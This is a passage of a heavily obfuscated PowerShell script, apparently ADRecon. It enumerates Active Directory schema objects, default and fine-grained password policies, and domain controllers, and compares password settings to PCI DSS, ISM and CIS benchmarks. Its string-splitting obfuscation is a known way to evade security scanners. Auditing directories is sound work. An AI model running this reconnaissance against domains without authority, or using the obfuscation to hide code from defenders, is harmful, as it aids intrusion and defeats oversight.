    If (${m`e`Thod} -eq ("{1}{0}"-f'DWS','A'))
    {
        Try
        {
            ${a`dscHe`ma`hist`oRY} = @( &("{0}{1}{3}{2}" -f 'Ge','t-A','Object','D') -SearchBase ((&("{2}{1}{0}" -f 'ADRootDSE','et-','G'))."SC`H`eMa`NamIng`COnTE`Xt") -SearchScope ("{1}{0}{2}"-f'neL','O','evel') -Filter * -Property ("{2}{4}{3}{0}{1}"-f'a','me','Dis','guishedN','tin'), ("{1}{0}"-f'ame','N'), ("{1}{2}{3}{0}"-f'tClass','O','bje','c'), ("{2}{1}{0}" -f 'ed','ang','whenCh'), ("{1}{3}{0}{2}"-f'ate','wh','d','enCre') )
        }
        Catch
        {
            &("{3}{0}{1}{2}"-f'e','-W','arning','Writ') ("{10}{7}{8}{0}{1}{4}{6}{3}{11}{2}{9}{5}"-f 'or w','hi','m','ating Sc','le enu','ts','mer','et-ADRSchema','History] Err','a Objec','[G','he')
            &("{1}{0}{3}{2}"-f'ite-Verb','Wr','e','os') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`UlL}
        }

        If (${AD`SC`hEMA`hIsTORy})
        {
            &("{0}{4}{2}{1}{3}"-f 'Wr','bos','te-Ver','e','i') "[*] Total Schema Objects: $([ADRecon.ADWSClass]::ObjectCount($ADSchemaHistory)) "
            ${A`DSC`HEMAO`Bj} =  (  DiR  variabLE:9B5P6).VaLUe::("{3}{1}{0}{2}" -f 'aParse','m','r','Sche').Invoke(${a`dscHe`MaHIs`To`RY}, ${T`HReA`ds})
            &("{2}{3}{0}{1}" -f 'ariabl','e','Re','move-V') ("{0}{1}{3}{2}" -f'ADSchema','Hi','y','stor')
        }
    }

    If (${M`etHOD} -eq ("{0}{1}" -f'L','DAP'))
    {
        If (${CRE`de`NtIal} -ne   (geT-vArIAble clf0n -VaLUeo  )::"E`MPtY")
        {
            ${OBJse`A`RCHpA`TH} = &("{2}{1}{0}"-f 'bject','w-O','Ne') ("{0}{2}{6}{3}{4}{1}{5}" -f 'Syst','ectoryE','em.','ectorySer','vices.Dir','ntry','Dir') "LDAP://$($DomainController)/$($objDomainRootDSE.schemaNamingContext)", ${c`Re`D`ENTiAL}."uSe`R`Name",${CredE`N`TI`Al}.("{5}{4}{2}{0}{1}{3}"-f 'o','r','etw','kCredential','tN','Ge').Invoke()."Pa`Ss`WoRd"
        }
        Else
        {
            ${O`B`JS`eaRCh`PAtH} = &("{2}{0}{1}" -f'ew-Obje','ct','N') ("{4}{2}{1}{6}{3}{5}{0}"-f 'try','.','tem','o','Sys','ryEn','DirectoryServices.Direct') "LDAP://$($objDomainRootDSE.schemaNamingContext)"
        }
        ${o`BJse`ArchER} = &("{0}{2}{3}{1}" -f'New-O','t','bje','c') ("{2}{0}{1}{4}{8}{5}{3}{7}{6}"-f 'D','ir','System.','.','ector','ces','rectorySearcher','Di','yServi') ${O`BJs`eARCHP`ATH}
        ${Obj`seA`RcHEr}."F`Ilt`Er" = (("{3}{1}{2}{0}" -f 'tClass=*)','j','ec','(ob'))
        ${o`BjSeA`RCHeR}."P`ROPERTI`EstOLo`AD".("{1}{2}{0}" -f 'e','Ad','dRang').Invoke((("{1}{3}{2}{4}{0}" -f 'dname','di','ui','sting','she'),("{1}{0}"-f 'ame','n'),("{2}{1}{0}" -f's','ctclas','obje'),("{1}{0}{2}" -f 'an','whench','ged'),("{3}{2}{1}{0}"-f'd','te','a','whencre')))
        ${ob`Jsear`C`heR}."S`eAr`ChsCOpe" = ("{0}{2}{1}"-f 'On','l','eLeve')

        Try
        {
            ${AD`Sch`E`Mahi`st`oRY} = ${oB`JSEa`RCHEr}.("{2}{1}{0}"-f'l','l','FindA').Invoke()
        }
        Catch
        {
            &("{1}{2}{0}{3}" -f'in','Wri','te-Warn','g') ("{10}{3}{5}{1}{11}{7}{2}{4}{8}{12}{0}{6}{9}" -f'merat','SchemaHistor',' ','t','Error','-ADR','ing',']',' while e',' Schema Objects','[Ge','y','nu')
            &("{2}{0}{1}" -f'ite-','Verbose','Wr') "[EXCEPTION] $($_.Exception.Message) "
            Return ${n`Ull}
        }
        ${oB`j`SEa`RCher}.("{2}{1}{0}"-f'e','pos','dis').Invoke()

        If (${A`dScHE`ma`hIstoRY})
        {
            &("{1}{2}{0}{3}" -f'Verbos','W','rite-','e') "[*] Total Schema Objects: $([ADRecon.LDAPClass]::ObjectCount($ADSchemaHistory)) "
            ${a`dSchemAo`Bj} =  $olxE::("{0}{3}{1}{2}"-f'Sc','maP','arser','he').Invoke(${AdscH`EM`Ah`IsTory}, ${Th`ReAds})
            &("{1}{2}{0}{3}{4}"-f '-V','Rem','ove','a','riable') ("{2}{1}{3}{0}" -f 'tory','hema','ADSc','His')
        }
    }

    If (${aD`s`Che`MaObj})
    {
        Return ${ad`schEmaO`Bj}
    }
    Else
    {
        Return ${Nu`ll}
    }
}

Function GE`T-ADRDEFAuL`TPa`Ss`W`OrDPOLIcY
{

    param(
        [Parameter(maNDaTorY = ${t`Rue})]
        [string] ${meth`oD},

        [Parameter(MANDaTOry = ${fa`L`SE})]
        [DirectoryServices.DirectoryEntry] ${oBJ`dO`MaIn}
    )

    If (${mE`THoD} -eq ("{0}{1}" -f 'AD','WS'))
    {
        Try
        {
            ${AD`PaSsPOl`iCY} = &("{5}{2}{3}{7}{0}{4}{1}{6}"-f 'tDomainPa','wordPolic','t-A','DDef','ss','Ge','y','aul')
        }
        Catch
        {
            &("{1}{3}{0}{2}"-f'arnin','W','g','rite-W') ("{9}{8}{1}{4}{0}{7}{5}{12}{3}{6}{10}{14}{13}{2}{11}"-f'y','dPol','olic','numerating th','ic','or ','e Defau','] Err','ltPasswor','[Get-ADRDefau','l','y','while e','ord P','t Passw')
            &("{2}{1}{3}{0}" -f 'ose','e','Write-V','rb') "[EXCEPTION] $($_.Exception.Message) "
            Return ${n`ULl}
        }

        If (${aDPa`S`s`PolIcY})
        {
            ${OBjV`A`lUes} = @( ("{6}{1}{7}{8}{2}{10}{0}{4}{3}{5}{9}" -f'sto','nforc','or','sswo','ry (pa','r','E','e pa','ssw','ds)','d hi'), ${a`DP`AsS`pOLiCY}."PA`ssWordHI`sTorYCOU`NT", "4", "4", ("{3}{2}{4}{0}{1}" -f'/ 8','.3.7','.','Req. 8.2','5 '), "N/A", "-", ("{2}{0}{1}"-f ' or',' more','24'),
            (("{0}{1}{4}{7}{6}{8}{5}{2}{3}"-f'M','aximum passw','y','s)','or','(da',' ag','d','e ')), ${ad`P`ASsPO`licY}."mAxpassW`oRD`AGe"."D`AYS", "90", "90", ("{2}{1}{3}{0}" -f ' 8.3.9','eq. 8.2','R','.4 /'), "365", ("{6}{3}{5}{1}{2}{4}{0}" -f'ar22','9','0 ','1','Rev:1 M','5','ISM-'), ("{1}{0}"-f' 365','1 to'),
            ("{3}{1}{2}{4}{0}"-f'e (days)','inimum pas','sword','M',' ag'), ${adpAS`sp`O`Licy}."mINPas`sWORD`A`GE"."D`Ays", "N/A", "N/A", "-", "N/A", "-", ("{2}{1}{0}" -f' more','or','1 '),
            ("{5}{1}{3}{4}{0}{2}"-f 'th','imum',' (characters)',' passwor','d leng','Min'), ${Adp`A`sSpO`licY}."m`iNpa`Sswo`RDL`eNG`TH", "7", "12", ("{4}{3}{0}{2}{1}" -f '.3 ','3.6','/ 8.','2','Req. 8.'), "14", ("{6}{1}{2}{5}{0}{3}{4}{7}{8}"-f' ISM-0421 ','n','tr','Rev:','8 D','ol:','Co','e','c21'), ("{0}{1}{2}"-f'14 or',' mor','e'),
            ("{3}{2}{4}{0}{5}{1}{6}"-f'x','emen','mee','Password must ','t comple','ity requir','ts'), ${aDPA`SsP`O`liCy}."c`OmPleXiTYe`N`AbLED", ${TR`UE}, ${tR`UE}, ("{3}{1}{0}{5}{4}{2}" -f'8.2.3','q. ','6','Re','.',' / 8.3'), "N/A", "-", ${T`RUE},
            ("{7}{0}{9}{6}{10}{3}{4}{1}{2}{5}{8}"-f 'r',' t','h','encryption for all users ','in','e do','i','Store password using ','main','evers','ble '), ${A`DP`As`SPoL`IcY}."r`EVERSibL`EeNCrYPTiON`E`NaB`lEd", "N/A", "N/A", "-", "N/A", "-", ${f`Al`Se},
            ("{1}{0}{7}{6}{5}{2}{4}{3}" -f 'ount loc','Acc','ration (min',')','s','u','t d','kou'), ${A`d`pAsspolI`cY}."LOCKOU`TD`U`RA`TioN"."m`inUTes", ("{3}{1}{2}{4}{0}"-f'0','an','ual unlock','0 (m',') or 3'), ("{5}{2}{1}{0}{3}{4}"-f 'l','anua',' (m',' un','lock) or 30','0'), ("{2}{0}{3}{1}" -f ' ','.3.4','Req. 8.1.7 /','8'), "N/A", "-", ("{2}{0}{1}" -f 'or',' more','15 '),
            ("{2}{0}{1}{6}{3}{7}{8}{4}{9}{5}" -f'c','count ','A','thr','(','tempts)','lockout ','eshol','d ','at'), ${ADP`AsS`pO`LiCy}."LOcKOu`TthR`ES`H`oLd", ("{0}{1}"-f'1 ','to 6'), ("{0}{1}" -f'1 to 1','0'), ("{3}{0}{4}{5}{1}{2}" -f'8.1.6',' ','8.3.4','Req. ',' ','/'), ("{1}{0}" -f '5','1 to '), ("{5}{1}{4}{2}{0}{3}" -f':2 Oc','trol: I','v','t19','SM-1403 Re','Con'), ("{0}{1}{2}"-f '1 ','to',' 5'),
            ("{6}{4}{0}{3}{11}{2}{8}{1}{5}{10}{7}{9}{12}" -f'cco','counte','o','u','set a','r','Re','f','ckout ','ter (min',' a','nt l','s)'), ${ADP`AsSPO`lICY}."loCK`O`UToB`ser`Vat`iOnwIn`DOw"."MINUT`ES", "N/A", "N/A", "-", "N/A", "-", ("{0}{1}{2}" -f'15',' or m','ore') )

            &("{4}{1}{0}{2}{3}"-f 'i','ove-Var','ab','le','Rem') ("{3}{0}{1}{2}" -f'Dpass','polic','y','A')
        }
    }

    If (${M`e`THoD} -eq ("{1}{0}" -f'DAP','L'))
    {
        If (${oB`JDOm`A`In})
        {
            
            ${P`w`dprOpERTIEs} = @{
                ("{5}{1}{3}{0}{4}{2}{6}"-f'W','O','_COM','MAIN_PASS','ORD','D','PLEX') = 1;
                ("{2}{0}{3}{7}{8}{5}{6}{4}{1}"-f 'MAI','E','DO','N_','HANG','RD_NO_ANON','_C','PASS','WO') = 2;
                ("{5}{0}{8}{7}{2}{3}{4}{6}{1}{9}" -f 'OMAI','AR_CH','N','O_','C','D','LE','RD_','N_PASSWO','ANGE') = 4;
                ("{3}{4}{0}{1}{2}{5}{6}" -f'IN_','L','OCK','D','OMA','OUT_A','DMINS') = 8;
                ("{3}{2}{5}{6}{0}{4}{7}{1}"-f'D_STORE_CLEA','T','S','DOMAIN_PA','RT','SWO','R','EX') = 16;
                ("{2}{1}{4}{5}{6}{0}{3}" -f'D_CHAN','OMAI','D','GE','N_','REFUSE_P','ASSWOR') = 32
            }

            If ((${OBj`D`O`Main}."PwDProp`E`R`Ti`eS"."va`lUE" -band ${PW`d`PrO`pERTies}[("{0}{2}{4}{1}{3}{5}" -f'DOMAIN','SSWORD','_','_COMPLE','PA','X')]) -eq ${pwD`pRO`pe`Rt`Ies}[("{1}{4}{0}{2}{3}"-f'_','D','CO','MPLEX','OMAIN_PASSWORD')])
            {
                ${coM`plexP`ASSwo`RdS} = ${t`Rue}
            }
            Else
            {
                ${Co`mplexpaSSW`OR`DS} = ${fAL`SE}
            }

            If ((${OBJ`D`o`mAin}."Pwd`PRo`PeRtIEs"."V`AluE" -band ${pWdp`RopER`TI`es}[("{0}{5}{3}{4}{7}{2}{1}{8}{6}" -f'DOMAIN_P','_CLEART','TORE','WO','RD','ASS','XT','_S','E')]) -eq ${PwdPR`Op`Er`T`IEs}[("{3}{4}{7}{0}{1}{5}{6}{8}{2}" -f'S','WO','EARTEXT','DOMA','IN_P','RD_STO','RE_','AS','CL')])
            {
                ${rEveRsiBLe`EnC`R`YPTiOn} = ${t`Rue}
            }
            Else
            {
                ${rev`e`R`s`iBleeNc`RypTi`On} = ${fal`se}
            }

            ${LOCK`outd`UraT`i`ON} = $(${OB`jDomA`In}.("{3}{1}{6}{8}{4}{2}{7}{0}{5}" -f't','r','r','Conve','ege','64','tLar','ToIn','geInt').Invoke(${obJDO`ma`In}."l`OCKoUt`dURa`Ti`ON"."vAl`Ue")/-600000000)

            If (${LO`cK`outD`Ura`Tion} -gt 99999)
            {
                ${LOc`KO`U`T`DuratIOn} = 0
            }

            ${o`BjV`Al`UeS} = @( (("{5}{8}{1}{0}{6}{3}{7}{4}{2}" -f'swor','e pas','asswords)','i','p','Enfor','d h','story (','c')), ${OBj`dOm`Ain}."pw`d`hiStoryLE`NgtH"."VAl`UE", "4", "4", ("{4}{0}{2}{1}{5}{3}"-f'eq. 8','2.5 /','.','.3.7','R',' 8'), "N/A", "-", ("{2}{1}{0}" -f ' more',' or','24'),
                ("{3}{4}{2}{7}{6}{0}{5}{1}"-f'a',' (days)','m','Maxi','mu','ssword age','p',' '), $(${Ob`JdoM`AIn}.("{7}{2}{3}{1}{6}{5}{4}{0}" -f '4','tLa','n','ver','6','tegerToInt','rgeIn','Co').Invoke(${obj`Doma`IN}."Max`pWDAgE"."val`Ue") / -864000000000), "90", "90", ("{2}{3}{4}{0}{1}"-f'/',' 8.3.9','Req. ','8.2.4',' '), "365", ("{2}{1}{3}{4}{0}"-f '1 Mar22','SM-1590 R','I','e','v:'), ("{1}{0}{2}" -f 'to ','1 ','365'),
            ("{0}{7}{1}{2}{5}{3}{4}{6}" -f'Minimum pass','ord',' a','e',' (da','g','ys)','w'), $(${oB`JdoM`AIN}.("{4}{1}{6}{0}{5}{2}{3}"-f 't','vertLa','Int6','4','Con','egerTo','rgeIn').Invoke(${Ob`jDo`main}."M`inP`WDaGe"."Va`lUe") /-864000000000), "N/A", "N/A", "-", "N/A", "-", ("{1}{0}" -f're','1 or mo'),
            ("{4}{1}{0}{3}{2}{5}{6}" -f' le','word','t','ng','Minimum pass','h (charact','ers)'), ${o`BJ`dOMAIN}."M`INpwdLe`NgTH"."Val`UE", "7", "12", ("{5}{1}{0}{2}{3}{4}"-f'8.2.3 /',' ',' ','8.','3.6','Req.'), "14", ("{6}{3}{5}{2}{1}{4}{0}"-f '21','v:8 De','e',': ISM','c','-0421 R','Control'), ("{2}{0}{1}"-f' or mor','e','14'),
            ("{7}{8}{3}{1}{9}{4}{2}{5}{10}{6}{0}"-f's',' meet compl','ity re',' must','x','qu','ment','Pas','sword','e','ire'), ${CO`mP`leX`p`ASsWorDs}, ${tR`Ue}, ${T`RuE}, ("{1}{3}{4}{0}{2}" -f '.','Req','6','. 8.2.3 / ','8.3'), "N/A", "-", ${tR`UE},
            ("{7}{8}{10}{0}{13}{4}{17}{6}{9}{11}{15}{14}{2}{1}{18}{19}{12}{3}{5}{16}"-f'sswor',' ','l users',' ','using reve','d','e enc','Stor','e p','ryp','a','t','the','d ','n for al','io','omain','rsibl','in',' '), ${RevE`Rs`I`Bl`eEnCrYPTi`ON}, "N/A", "N/A", "-", "N/A", "-", ${fa`lsE},
            ("{3}{2}{8}{9}{5}{6}{4}{0}{1}{7}"-f 'tion (m','ins','n','Accou','ra','o','ckout du',')','t',' l'), ${lOCkOU`T`DuRaTI`on}, (("{0}{4}{3}{2}{1}" -f '0 ','30','k) or ','c','(manual unlo')), ("{4}{3}{5}{2}{0}{6}{1}"-f ' unlock',' or 30','al','(m','0 ','anu',')'), ("{3}{2}{0}{5}{1}{4}" -f '7 /','3','1.','Req. 8.','.4',' 8.'), "N/A", "-", ("{1}{2}{0}" -f 'ore','15 or ','m'),
            (("{5}{0}{2}{6}{7}{3}{4}{8}{1}" -f'cko','mpts)','ut','ld (at','t','Account lo',' thresh','o','e')), ${oB`jD`OM`AIN}."lo`CkoUtT`HREshO`lD"."v`ALue", ("{1}{0}"-f'o 6','1 t'), ("{1}{2}{0}"-f '0','1 to ','1'), ("{2}{0}{1}{4}{3}{5}"-f '.',' ','Req','1.6 ','8.','/ 8.3.4'), ("{0}{1}"-f '1 to',' 5'), ("{5}{1}{0}{2}{4}{7}{3}{6}"-f'4','trol: ISM-1','03 Rev',' ',':','Con','Oct19','2'), ("{0}{1}"-f '1 to',' 5'),
            ("{2}{6}{7}{4}{5}{9}{10}{1}{0}{8}{3}" -f 'i',' (m','Reset','s)','ockout cou','nt',' a','ccount l','n','er af','ter'), $(${o`BJDO`MaiN}.("{4}{5}{2}{1}{3}{0}"-f'egerToInt64','argeIn','nvertL','t','C','o').Invoke(${oB`jdo`MaiN}."LoCKoUToBSerVA`T`iO`Nw`INdoW"."vAL`Ue")/-600000000), "N/A", "N/A", "-", "N/A", "-", ("{2}{0}{1}" -f '5 or mor','e','1') )

            &("{0}{3}{1}{2}"-f 'R','a','riable','emove-V') ("{2}{1}{3}{0}{4}"-f'pe','d','pw','Pro','rties')
            &("{1}{0}{4}{3}{2}" -f 'ove-','Rem','ble','ia','Var') ("{1}{3}{2}{0}"-f 's','Com','ssword','plexPa')
            &("{1}{0}{4}{2}{3}" -f 'e','R','iab','le','move-Var') ("{2}{1}{0}{3}" -f'ble','versi','Re','Encryption')
        }
    }

    If (${O`BJvaLU`eS})
    {
        ${aDPA`sSpo`lo`Bj} = @()
        For (${I} = 0; ${i} -lt $(${O`BJVAL`UeS}."Cou`Nt"); ${I}++)
        {
            ${o`BJ} = &("{3}{1}{2}{0}" -f 'ject','-O','b','New') ("{2}{1}{0}" -f'bject','O','PS')
            ${O`BJ} | &("{1}{0}{2}"-f'd','A','d-Member') -MemberType ("{0}{1}{2}{3}"-f'Not','ePr','ope','rty') -Name ("{0}{1}{2}"-f'Po','l','icy') -Value ${O`B`jVALuES}[${I}]
            ${o`Bj} | &("{2}{3}{1}{0}" -f 'mber','-Me','A','dd') -MemberType ("{0}{1}{2}" -f 'Not','eP','roperty') -Name ("{1}{2}{0}{3}{4}"-f 'en','C','urr','t Va','lue') -Value ${Obj`VaLu`es}[${i}+1]
            ${o`BJ} | &("{2}{0}{1}" -f'dd-Membe','r','A') -MemberType ("{2}{0}{1}{3}" -f'ro','per','NoteP','ty') -Name ("{3}{1}{4}{2}{0}" -f '1','D','.2.','PCI ','SS v3') -Value ${Ob`jVal`UES}[${i}+2]
            ${o`BJ} | &("{1}{0}{2}"-f'dd-Membe','A','r') -MemberType ("{3}{1}{2}{0}"-f 'rty','rop','e','NoteP') -Name ("{0}{3}{1}{2}" -f'P','I DSS v4','.0','C') -Value ${oBjVAL`U`eS}[${I}+3]
            ${o`BJ} | &("{3}{1}{0}{2}"-f '-Memb','dd','er','A') -MemberType ("{0}{2}{1}"-f 'NoteP','y','ropert') -Name ("{0}{1}{2}{3}"-f'P','CI DSS',' Requir','ement') -Value ${ObJV`A`LUes}[${i}+4]
            ${O`BJ} | &("{3}{0}{1}{2}"-f 'dd-M','em','ber','A') -MemberType ("{1}{2}{0}" -f 'y','NotePrope','rt') -Name ("{2}{0}{1}" -f 'C',' ISM','ACS') -Value ${O`Bj`VaLUES}[${i}+5]
            ${o`Bj} | &("{3}{0}{2}{1}" -f 'dd-Me','ber','m','A') -MemberType ("{2}{1}{0}" -f 'rty','ope','NotePr') -Name ("{0}{4}{3}{2}{1}" -f'ISM ','Jun2022','s 16','ontrol','C') -Value ${O`BJvALu`ES}[${i}+6]
            ${o`BJ} | &("{0}{1}{2}" -f'Add-Me','mbe','r') -MemberType ("{1}{0}{2}{3}"-f 'ePrope','Not','rt','y') -Name ("{1}{4}{3}{2}{0}"-f ' 2022','C','chmark','n','IS Be') -Value ${ObJval`U`es}[${i}+7]
            ${I} += 7
            ${a`DpASs`PolObj} += ${O`BJ}
        }
        &("{1}{3}{2}{4}{0}" -f'-Variable','Re','v','mo','e') ("{2}{0}{1}" -f'bjV','alues','O')
        Return ${aDPAs`Spol`oBj}
    }
    Else
    {
        Return ${n`ULl}
    }
}

Function geT-`ADrfINegRain`e`DpasSW`OR`dp`OlIcy
{

    param(
        [Parameter(MaNDAtoRy = ${tR`UE})]
        [string] ${M`E`THOD},

        [Parameter(MaNdaTORy = ${f`AlSe})]
        [DirectoryServices.DirectoryEntry] ${OBj`DOma`in}
    )

    If (${MetH`OD} -eq ("{0}{1}" -f'ADW','S'))
    {
        Try
        {
            ${A`D`FiNE`pASsp`OlicY} = &("{5}{3}{1}{7}{4}{6}{0}{2}"-f 'ic','in','y','F','Gr','Get-AD','ainedPasswordPol','e') -Filter *
        }
        Catch
        {
            &("{2}{3}{1}{0}{4}"-f'-Warnin','te','Wr','i','g') ("{0}{13}{20}{2}{17}{14}{5}{9}{11}{16}{18}{7}{10}{3}{6}{19}{21}{4}{15}{12}{1}{8}"-f '[G','d Polic','A','r whil','ined Pa','nedPassw','e enumerati','] Er','y','ordPol','ro','i','or','et','rai','ssw','c','DRFineG','y','n','-','g the Fine Gra')
            &("{2}{1}{0}{3}"-f 'rb','ite-Ve','Wr','ose') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`ULl}
        }

        If (${a`dFIn`epAss`poLIcy})
        {
            ${f`gPPPASS`POLobJ} = @()

            ${Ad`FiNep`ASs`PoLI`Cy} | &("{1}{2}{3}{0}"-f't','ForEach-','Obje','c') {
                ${A`ppLieS`To} = ""
                ${aPP`lIE`Sto} = ${_}."APPLi`Es`To" -join ", "

                ${FG`PPV`AluEs} = [ordered]@{
                    ("{0}{1}"-f'Na','me')                                       = $(${_}."N`AME")
                    ("{1}{0}{2}"-f'es T','Appli','o')                                 = ${Ap`p`LI`eSTO}
                    ("{5}{7}{6}{1}{3}{0}{4}{2}"-f 'his','s','ory','sword ','t','E','e pa','nforc')                   = ${_}."P`AS`S`wORdHIS`TOrYcOUNt"
                    ("{0}{3}{4}{1}{5}{2}"-f'Max','word ag','(days)','imum p','ass','e ')                = ${_}."mAxp`ASSw`OR`daGE"."d`AYS"
                    ("{3}{4}{0}{2}{1}{5}{6}" -f'u','sswo','m pa','Mini','m','rd age (da','ys)')                = ${_}."M`in`pa`SSwORd`AGe"."d`AYs"
                    ("{1}{2}{5}{6}{0}{3}{4}"-f'sword le','Mi','n','ngt','h','im','um pas')                    = ${_}."mi`N`P`ASSWORDlENg`Th"
                    ("{2}{8}{7}{9}{1}{10}{4}{11}{6}{5}{0}{3}" -f 'ent','et c','Passwor','s','requ','m','e','must m','d ','e','omplexity ','ir') = ${_}."Co`MpLEXI`TY`Ena`B`LED"
                    ("{0}{9}{6}{10}{7}{4}{1}{2}{12}{11}{3}{5}{8}"-f'Sto','ible',' ','rypt','ing revers','io','ord','us','n','re passw',' ','nc','e') = ${_}."rEveRsibleE`NCrY`p`TiONEn`AB`LED"
                    ("{2}{4}{0}{5}{7}{1}{3}{6}"-f'u','ation (m','Account','ins',' locko','t ',')','dur')            = ${_}."loc`K`Ou`Tdu`RAtIoN"."M`inutEs"
                    ("{3}{2}{1}{4}{0}"-f'old','t lockout th','coun','Ac','resh')                  = ${_}."Lock`out`TH`RESh`olD"
                    (("{10}{7}{2}{8}{6}{1}{9}{3}{5}{4}{0}" -f 'ns)','er','nt lo','er ','mi','(','kout count','u','c',' aft','Reset acco')) = ${_}."loCkouT`obS`ERvAt`iOnWi`NdOw"."m`in`UTes"
                    ("{2}{0}{3}{1}" -f're','nce','P','cede')                                 = $(${_}."P`Re`CeDe`NcE")
                }

                ${f`GP`PoBj} = &("{0}{2}{1}" -f'New-Obj','t','ec') -TypeName ("{0}{2}{1}" -f'PsObje','t','c') -Property ${F`gPpV`Alu`ES}
                ${fg`PPpAS`sPO`L`OBj} += ${FgPP`O`Bj}
            }
            &("{1}{2}{3}{4}{0}"-f 'iable','Rem','o','v','e-Var') ("{1}{2}{0}{3}" -f'c','ADFinepass','poli','y')
        }
    }

    If (${M`eTHoD} -eq ("{1}{0}"-f 'P','LDA'))
    {
        If (${OB`jD`OMAIN})
        {
            ${O`Bjs`EaRCheR} = &("{0}{2}{1}{3}" -f'Ne','ec','w-Obj','t') ("{5}{8}{9}{0}{11}{7}{1}{3}{4}{6}{10}{2}" -f 'Directory','vic','cher','es','.D','S','irec','er','ys','tem.','torySear','S') ${Ob`jDOM`AIn}
            ${ob`j`Sea`RChER}."pA`GEsiZe" = ${PAgEs`I`ZE}
            ${oBJS`Ea`RcH`Er}."FIl`TER" = (("{7}{1}{2}{3}{6}{0}{4}{5}"-f'tting','b','jectClass=ms','D','s',')','S-PasswordSe','(o'))
            ${o`Bj`S`EarCHER}."S`E`Ar`chsCoPE" = ("{1}{2}{0}"-f 'ee','Subt','r')
            Try
            {
                ${a`dfIneP`As`SPoL`icy} = ${ob`jseAR`CH`Er}.("{0}{1}"-f'FindA','ll').Invoke()
            }
            Catch
            {
                &("{1}{2}{3}{0}"-f'arning','Write','-','W') ("{5}{9}{16}{4}{7}{12}{10}{1}{2}{0}{18}{3}{13}{17}{20}{6}{11}{15}{8}{19}{14}"-f'Er','Policy]',' ','le e','neGrained','[Get','he Fine G','Passwo','d P','-','d','rai','r','nu','ssword Policy','ne','ADRFi','mer','ror whi','a','ating t')
                &("{0}{1}{3}{2}{4}" -f 'Write-Ve','rb','s','o','e') "[EXCEPTION] $($_.Exception.Message) "
                Return ${nu`LL}
            }

            If (${aDFI`Ne`PaSsPoli`Cy})
            {
                If (  $olxE::("{1}{3}{2}{0}"-f't','Obje','tCoun','c').Invoke(${adFINePAS`SPo`li`cy}) -ge 1)
                {
                    ${Fg`P`p`pasS`pOlobJ} = @()
                    ${adfINe`paSSp`O`L`IcY} | &("{0}{2}{3}{1}{4}" -f'ForEa','-Obj','c','h','ect') {
                        ${aPPL`i`Es`TO} = ""
                        ${a`PplIE`sto} = ${_}."pR`o`pErTiEs".'msds-psoappliesto' -join ", "

                        ${Fg`pP`VaLU`eS} = [ordered]@{
                            ("{1}{0}"-f 'me','Na')                                       = $(${_}."PRopER`Ti`eS"."na`Me")
                            ("{1}{0}{2}" -f'pp','A','lies To')                                 = ${aPpLIe`s`To}
                            ("{2}{3}{0}{5}{1}{4}"-f'ce','hi','Enf','or','story',' password ')                   = $(${_}."PRopeRT`I`eS".'msds-passwordhistorylength')
                            ("{3}{0}{2}{1}{5}{4}"-f 'ximum ','word a','pass','Ma','e (days)','g')                = $($(${_}."P`ROp`erT`IeS".'msds-maximumpasswordage') /-864000000000)
                            ("{6}{0}{1}{4}{3}{5}{2}{7}" -f'i','n','age (da','r','imum passwo','d ','M','ys)')                = $($(${_}."PrOP`e`R`TieS".'msds-minimumpasswordage') /-864000000000)
                            ("{4}{2}{5}{3}{1}{0}"-f'length','ord ','pa','sw','Minimum ','s')                    = $(${_}."P`ROPerti`Es".'msds-minimumpasswordlength')
                            ("{8}{10}{7}{6}{9}{2}{3}{5}{11}{0}{1}{4}"-f 'q','uir','eet co','mp','ements','lexit','mu','d ','Passwo','st m','r','y re') = $(${_}."P`ROP`ERt`IEs".'msds-passwordcomplexityenabled')
                            ("{8}{5}{1}{2}{4}{6}{7}{3}{0}"-f'n','g',' rever','ptio','sibl',' password usin','e en','cry','Store') = $(${_}."pRop`eRt`IEs".'msds-passwordreversibleencryptionenabled')
                            ("{4}{0}{7}{6}{1}{3}{5}{2}"-f'unt','t d','(mins)','urati','Acco','on ','ckou',' lo')            = $($(${_}."pROp`ERTI`es".'msds-lockoutduration')/-600000000)
                            ("{2}{1}{4}{0}{3}" -f 'thre','nt','Accou','shold',' lockout ')                  = $(${_}."pROPER`TI`eS".'msds-lockoutthreshold')
                            (("{4}{0}{10}{1}{2}{6}{5}{8}{9}{7}{11}{3}"-f'es','t a','ccount ',')','R','ck','lo','counter aft','o','ut ','e','er (mins')) = $($(${_}."pR`Op`ertIEs".'msds-lockoutobservationwindow')/-600000000)
                            ("{0}{3}{1}{2}"-f'Prec','c','e','eden')                                 = $(${_}."PRO`PE`RT`iES".'msds-passwordsettingsprecedence')
                        }

                        ${f`gpp`obJ} = &("{2}{0}{1}"-f 'e','ct','New-Obj') -TypeName ("{2}{0}{1}" -f 'sObj','ect','P') -Property ${fG`Pp`VA`lueS}
                        ${Fg`P`PPasSPo`LObJ} += ${f`gPp`OBj}
                    }
                }
                &("{2}{1}{3}{0}" -f'ble','emov','R','e-Varia') ("{2}{0}{3}{4}{1}"-f 'Fin','olicy','AD','epas','sp')
            }
        }
    }

    If (${Fgp`pPas`spoLo`BJ})
    {
        Return ${FGppp`A`sspO`LObJ}
    }
    Else
    {
        Return ${n`Ull}
    }
}

Function G`eT-Ad`R`DOmAiN`cO`N`TRo`Ller
{

    param(
        [Parameter(MAnDatory = ${t`Rue})]
        [string] ${METH`od},

        [Parameter(mANdaTORy = ${fA`L`Se})]
        [DirectoryServices.DirectoryEntry] ${Ob`jdO`MaIN},

        [Parameter(MANDATOry = ${Fa`L`Se})]
        [Management.Automation.PSCredential] ${cR`e`D`eNTial} =   ( varIable ("c"+"LF0n")  -ValU  )::"e`mPty"
    )

    If (${M`e`ThoD} -eq ("{0}{1}"-f'AD','WS'))
    {
        Try
        {
            ${adDOmAi`NCo`NT`RollErS} = @( &("{1}{3}{0}{2}"-f'ain','Get-AD','Controller','Dom') -Filter * )
        }
        Catch
        {
            &("{3}{0}{2}{1}{4}" -f'te-W','in','arn','Wri','g') ("{17}{11}{1}{6}{14}{7}{13}{15}{8}{12}{19}{20}{0}{16}{4}{9}{5}{18}{3}{2}{10}{21}" -f 'wh','DRDomai','er ','ontroll','le ','merating Do','nCo','r','er]','enu','Obje','-A',' Er','ol','nt','l','i','[Get','mainC','r','or ','cts')
            &("{2}{1}{0}" -f'e','s','Write-Verbo') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`ULl}
        }

        
        If (${A`DD`oMaIncOn`TrO`LL`eRs})
        {
